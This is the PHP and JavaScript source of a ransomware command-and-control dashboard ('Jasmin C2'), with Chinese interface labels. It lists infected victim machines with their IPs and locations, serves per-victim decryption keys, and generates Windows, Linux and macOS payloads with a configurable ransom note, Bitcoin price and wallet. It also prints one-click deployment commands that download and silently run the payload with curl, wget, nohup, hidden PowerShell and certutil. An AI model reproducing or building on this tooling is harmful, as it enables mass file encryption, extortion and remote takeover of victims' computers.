<?php
require_once __DIR__ . '/includes/auth.php';
require_once __DIR__ . '/includes/csrf.php';
require_auth();
include __DIR__ . '/database/db_conection.php';

$records_per_page = 10;
$pageno = max(1, intval($_GET['pageno'] ?? 1));
$search = trim($_GET['search'] ?? '');
$offset = ($pageno - 1) * $records_per_page;

if ($search !== '') {
    $like = '%' . $search . '%';
    $count_stmt = $pdo->prepare('SELECT COUNT(*) FROM victims WHERE machine_name LIKE :s1 OR computer_user LIKE :s2 OR os LIKE :s3 OR ip LIKE :s4 OR location LIKE :s5 OR systemid LIKE :s6');
    $count_stmt->execute([':s1'=>$like,':s2'=>$like,':s3'=>$like,':s4'=>$like,':s5'=>$like,':s6'=>$like]);
    $total_rows = (int)$count_stmt->fetchColumn();
    $data_stmt = $pdo->prepare('SELECT * FROM victims WHERE machine_name LIKE :s1 OR computer_user LIKE :s2 OR os LIKE :s3 OR ip LIKE :s4 OR location LIKE :s5 OR systemid LIKE :s6 ORDER BY id DESC LIMIT :offset, :limit');
    $data_stmt->bindValue(':s1',$like);$data_stmt->bindValue(':s2',$like);$data_stmt->bindValue(':s3',$like);
    $data_stmt->bindValue(':s4',$like);$data_stmt->bindValue(':s5',$like);$data_stmt->bindValue(':s6',$like);
    $data_stmt->bindValue(':offset',$offset,PDO::PARAM_INT);$data_stmt->bindValue(':limit',$records_per_page,PDO::PARAM_INT);
    $data_stmt->execute();
} else {
    $total_rows = (int)$pdo->query('SELECT COUNT(*) FROM victims')->fetchColumn();
    $data_stmt = $pdo->prepare('SELECT * FROM victims ORDER BY id DESC LIMIT :offset, :limit');
    $data_stmt->bindValue(':offset',$offset,PDO::PARAM_INT);$data_stmt->bindValue(':limit',$records_per_page,PDO::PARAM_INT);
    $data_stmt->execute();
}
$total_pages = max(1,(int)ceil($total_rows/$records_per_page));
if ($pageno > $total_pages) $pageno = $total_pages;
$rows = $data_stmt->fetchAll();
function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
$csrf = csrf_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Jasmin C2</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link rel="stylesheet" href="./assets/css/dashboard.css">
</head>
<body>
<nav class="sidebar" id="sidebar">
  <div class="sidebar-head"><i class="fas fa-skull-crossbones"></i><span>JASMIN</span></div>
  <a href="dashboard.php" class="nav-item active"><i class="fas fa-chart-pie"></i><span>仪表盘</span></a>
  <a href="#gen" class="nav-item" onclick="showTab('gen')"><i class="fas fa-virus"></i><span>载荷生成</span></a>
  <a href="#victims" class="nav-item" onclick="showTab('victims')"><i class="fas fa-desktop"></i><span>受害主机</span></a>
  <a href="#update" class="nav-item" onclick="showTab('update')"><i class="fas fa-cloud-download-alt"></i><span>系统更新</span></a>
  <a href="#decrypt" class="nav-item" onclick="showTab('decrypt')"><i class="fas fa-unlock-alt"></i><span>解密教程</span></a>
  <div class="sidebar-foot">
    <span class="user-badge"><i class="fas fa-user-shield"></i> <?=h($_SESSION['username'])?></span>
    <a href="logout.php"><i class="fas fa-sign-out-alt"></i> 退出</a>
  </div>
</nav>
<button class="hamburger" id="ham" onclick="document.getElementById('sidebar').classList.toggle('open')"><i class="fas fa-bars"></i></button>

<main class="content">
<!-- Stats -->
<section class="stats-row">
  <div class="stat-card red"><div class="stat-icon"><i class="fas fa-desktop"></i></div><div><span class="stat-num"><?=$total_rows?></span><label>已感染</label></div></div>
  <div class="stat-card blue"><div class="stat-icon"><i class="fas fa-globe"></i></div><div><span class="stat-num"><?=$total_pages?></span><label>页数</label></div></div>
  <div class="stat-card green"><div class="stat-icon"><i class="fas fa-virus"></i></div><div><span class="stat-num">3</span><label>平台</label></div></div>
</section>

<?php
$server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$_SERVER['HTTP_HOST'];
?>
<!-- 载荷生成器 -->
<section class="panel" id="panel-gen">
<h2><i class="fas fa-virus"></i> 载荷生成器</h2>

<div class="gen-opts" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:20px">
  <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="<?=h($server_url)?>/handshake.php"></div>
  <div class="field"><label>握手密钥</label><input type="text" id="gensecret" value="jasmin@123"></div>
  <div class="field"><label>目标系统</label>
    <select id="gen-platform" style="width:100%;padding:9px 12px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.85rem">
      <option value="win">🖥️ Windows (C# / .NET)</option>
      <option value="linux">🐧 Linux (Python3)</option>
      <option value="macos">🍎 macOS (Python3)</option>
    </select>
  </div>
</div>

<h3 style="color:var(--accent2);font-size:.9rem;margin-bottom:12px"><i class="fas fa-scroll"></i> 勒索信配置</h3>
<div class="gen-opts" style="grid-template-columns:1fr 1fr">
  <div class="field"><label>勒索标题</label><input type="text" id="ransom-title" value="YOUR FILES HAVE BEEN ENCRYPTED"></div>
  <div class="field"><label>联系方式</label><input type="text" id="ransom-contact" value="Contact: jasmin@protonmail.com" placeholder="邮箱/Telegram/Bitcoin地址"></div>
</div>
<div class="field" style="margin-bottom:14px"><label>勒索信正文 (支持多行)</label>
<textarea id="ransom-body" rows="4" style="width:100%;padding:10px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.84rem;resize:vertical;font-family:monospace">所有文件已使用 AES-256 + RSA-2048 军事级加密。
每个文件拥有独立密钥，由RSA公钥保护。
不要重命名/删除 .jasmin 文件，不要用第三方软件解密。
联系我们获取私钥以解密文件。</textarea>
</div>
<div class="gen-opts" style="grid-template-columns:1fr 1fr">
  <div class="field"><label>赎金金额</label><input type="text" id="ransom-price" value="0.5 BTC" placeholder="如: 0.5 BTC / $5000 USDT"></div>
  <div class="field"><label>支付地址</label><input type="text" id="ransom-wallet" value="" placeholder="BTC/ETH/USDT地址"></div>
</div>

<div style="display:flex;gap:10px;margin-top:16px">
  <button class="btn btn-red" onclick="genPayload()"><i class="fas fa-cog"></i> 生成载荷</button>
  <button class="btn btn-red" style="background:#10b981" onclick="genKey()"><i class="fas fa-key"></i> 生成RSA密钥对</button>
</div>
<div id="key-result" class="gen-result" style="margin-top:10px"></div>
<div id="gen-result" class="gen-result" style="margin-top:16px"></div>
</section>

<!-- Victims -->
<section class="panel" id="panel-victims">
<h2><i class="fas fa-desktop"></i> Victims</h2>
<form action="dashboard.php" method="get" class="search-form">
  <input type="text" name="search" placeholder="搜索主机名、IP、系统、位置..." value="<?=h($search)?>">
  <button type="submit"><i class="fas fa-search"></i></button>
</form>
<div class="table-wrap"><table>
<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>位置</th><th>日期</th><th>时间</th><th>密钥</th></tr></thead>
<tbody>
<?php if(empty($rows)):?>
<tr><td colspan="9" class="empty">暂无受害主机数据</td></tr>
<?php else: foreach($rows as $i=>$row):
  $sm=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['machine_name']);
  $su=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['computer_user']);
  $ss=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['systemid']);
  $nt=date("H-i-s",strtotime($row['time']));
  $fp='passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
?>
<tr>
  <td><?=$offset+$i+1?></td><td><?=h($row['machine_name'])?></td>
  <td><?=h($row['computer_user'])?></td><td><span class="os-badge"><?=h($row['os'])?></span></td>
  <td><?=h($row['ip'])?></td><td><?=h($row['location'])?></td>
  <td><?=h($row['date'])?></td><td><?=h($row['time'])?></td>
  <td><?php if(file_exists($fp)):?><a href="download_file.php?file=<?=urlencode($fp)?>" class="btn-sm"><i class="fas fa-key"></i></a><?php else:?><span class="muted">—</span><?php endif;?></td>
</tr>
<?php endforeach;endif;?>
</tbody></table></div>
<?php if($total_pages>1):?>
<nav class="pagination">
  <a href="?search=<?=urlencode($search)?>&pageno=1" <?=$pageno<=1?'class="disabled"':''?>>&laquo;</a>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=max(1,$pageno-1)?>" <?=$pageno<=1?'class="disabled"':''?>>&lsaquo;</a>
  <?php $s2=max(1,$pageno-3);$e2=min($total_pages,$pageno+3);for($p=$s2;$p<=$e2;$p++):?>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=$p?>" <?=$p===$pageno?'class="active"':''?>><?=$p?></a>
  <?php endfor;?>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=min($total_pages,$pageno+1)?>" <?=$pageno>=$total_pages?'class="disabled"':''?>>&rsaquo;</a>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=$total_pages?>" <?=$pageno>=$total_pages?'class="disabled"':''?>>&raquo;</a>
</nav>
<?php endif;?>
</section>
</main>

<!-- Update Panel (hidden by default) -->
<?php include __DIR__ . '/includes/decrypt_panel.html'; ?>
<script>
// inject update panel into main before script
(function(){
  var main=document.querySelector('.content');
  var sec=document.createElement('section');
  sec.className='panel';sec.id='panel-update';sec.style.display='none';
  sec.innerHTML='<h2><i class="fas fa-cloud-download-alt"></i> 检查更新</h2>'
    +'<p style="color:#94a3b8;margin-bottom:16px">当前版本: <b style="color:#4dc3fa"><?php $v=__DIR__."/../VERSION";if(!file_exists($v))$v=__DIR__."/VERSION";echo trim(@file_get_contents($v)?:"0.0.0");?></b></p>'
    +'<button class="btn btn-red" onclick="checkUpdate()"><i class="fas fa-sync-alt"></i> 检查更新</button>'
    +'<div id="update-result" style="margin-top:16px"></div>';
  main.appendChild(sec);
})();

function checkUpdate(){
  var r=document.getElementById('update-result');
  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在检查...</span>';
  fetch('update.php?action=check').then(x=>x.json()).then(d=>{
    if(!d.ok||!d.update){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 已是最新版本 (v'+d.current+')</div>';return;}
    var info='远程版本: <b>v'+d.latest+'</b>';
    if(d.latest_commit)info+=' | 提交: '+d.latest_commit+' — '+d.message;
    if(d.date)info+='<br>时间: '+d.date;
    r.innerHTML='<div class="gen-ok"><i class="fas fa-arrow-circle-up"></i> 发现新版本<br>'+info
      +'<br><br><button class="btn btn-red" onclick="doUpdate()"><i class="fas fa-download"></i> 一键更新</button></div>';
  }).catch(e=>{r.innerHTML='<div class="gen-err">检查失败: '+e+'</div>';});
}
function doUpdate(){
  var r=document.getElementById('update-result');
  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在更新，请勿刷新...</span>';
  fetch('update.php?action=update').then(x=>x.json()).then(d=>{
    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 更新完成 ('+d.method+')<br><pre style="margin-top:8px;font-size:.78rem;color:#94a3b8">'+(d.output||d.msg)+'</pre><br><a href="dashboard.php" class="btn btn-red" style="display:inline-flex;margin-top:8px"><i class="fas fa-redo"></i> 刷新页面</a></div>';}
    else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
  }).catch(e=>{r.innerHTML='<div class="gen-err">更新失败: '+e+'</div>';});
}

function showDT(t){
  document.querySelectorAll('.dt-content').forEach(d=>d.style.display='none');
  document.querySelectorAll('.dt-btn').forEach(b=>b.classList.remove('active'));
  var el=document.getElementById('dt-'+t);if(el)el.style.display='block';
  event.target.classList.add('active');
}

function showTab(t){
  document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
  var el=document.getElementById('panel-'+t);if(el)el.style.display='block';
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  event.target.closest('.nav-item').classList.add('active');
}
function genKey(){
  var r=document.getElementById('key-result');
  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成RSA-2048密钥对...</span>';
  fetch('keygen.php').then(x=>x.json()).then(d=>{
    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-key"></i> '+d.msg+'<br><br><b>公钥 (内置到载荷模板):</b><pre class="dt-code" style="margin-top:8px;max-height:120px;overflow:auto;font-size:.72rem">'+d.pub+'</pre><div style="margin-top:8px"><a href="payloads/jasmin_private.pem" download class="btn btn-red" style="display:inline-flex"><i class="fas fa-download"></i> 下载私钥</a> <a href="payloads/jasmin_public.pem" download class="btn btn-red" style="display:inline-flex;background:#4dc3fa"><i class="fas fa-download"></i> 下载公钥</a></div></div>';}
    else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
  }).catch(e=>{r.innerHTML='<div class="gen-err">'+e+'</div>';});
}

function genPayload(){
  var p=document.getElementById('gen-platform').value;
  var c2=document.getElementById('c2url').value;
  var sec=document.getElementById('gensecret').value;
  var res=document.getElementById('gen-result');
  res.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成 '+p+' 载荷...</span>';
  var fd=new FormData();
  fd.append('platform',p);fd.append('c2_url',c2);fd.append('secret',sec);fd.append('csrf_token','<?=$csrf?>');
  fd.append('ransom_title',document.getElementById('ransom-title').value);
  fd.append('ransom_contact',document.getElementById('ransom-contact').value);
  fd.append('ransom_body',document.getElementById('ransom-body').value);
  fd.append('ransom_price',document.getElementById('ransom-price').value);
  fd.append('ransom_wallet',document.getElementById('ransom-wallet').value);
  fetch('generate.php',{method:'POST',body:fd})
  .then(r=>r.json()).then(d=>{
    if(!d.ok){res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';return;}
    var pname={'win':'Windows','linux':'Linux','macos':'macOS'}[p]||p;
    var dl='payloads/'+d.file;
    var html='<div class="gen-ok">';
    html+='<i class="fas fa-check-circle"></i> <b>'+pname+'</b> 载荷已就绪: <a href="'+dl+'" download>'+d.file+'</a> ('+d.size+' B)';
    html+='<div style="margin-top:16px;padding:14px;background:var(--bg);border:1px solid var(--border);border-radius:8px">';
    html+='<h4 style="color:var(--accent2);margin-bottom:10px"><i class="fas fa-terminal"></i> 一键部署命令</h4>';
    if(p==='linux'||p==='macos'){
      var rurl=location.origin+'/'+dl;
      html+='<pre class="dt-code" style="margin:0">'+
        '# 方式1: curl 直接运行\n'+
        'curl -sL '+rurl+' | python3\n\n'+
        '# 方式2: wget 下载后运行\n'+
        'wget -q '+rurl+' -O /tmp/.j && python3 /tmp/.j && rm -f /tmp/.j\n\n'+
        '# 方式3: 后台静默运行\n'+
        'nohup python3 -c \"$(curl -sL '+rurl+')\" > /dev/null 2>&1 &'+
        '</pre>';
    }else{
      html+='<pre class="dt-code" style="margin:0">'+
        ':: 方式1: PowerShell 下载运行\n'+
        'powershell -w hidden -c \"IWR -Uri \''+location.origin+'/'+dl+'\' -OutFile $env:TEMP\\\\j.cs; '+
        'cd $env:TEMP; csc /target:winexe /out:j.exe j.cs; Start-Process j.exe\"\n\n'+
        ':: 方式2: certutil 下载\n'+
        'certutil -urlcache -split -f '+location.origin+'/'+dl+' %TEMP%\\\\j.cs && csc /target:winexe /out:%TEMP%\\\\j.exe %TEMP%\\\\j.cs && %TEMP%\\\\j.exe'+
        '</pre>';
    }
    html+='</div></div>';
    res.innerHTML=html;
  }).catch(e=>{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+e+'</div>';});
}
</script>
</body>
</html>
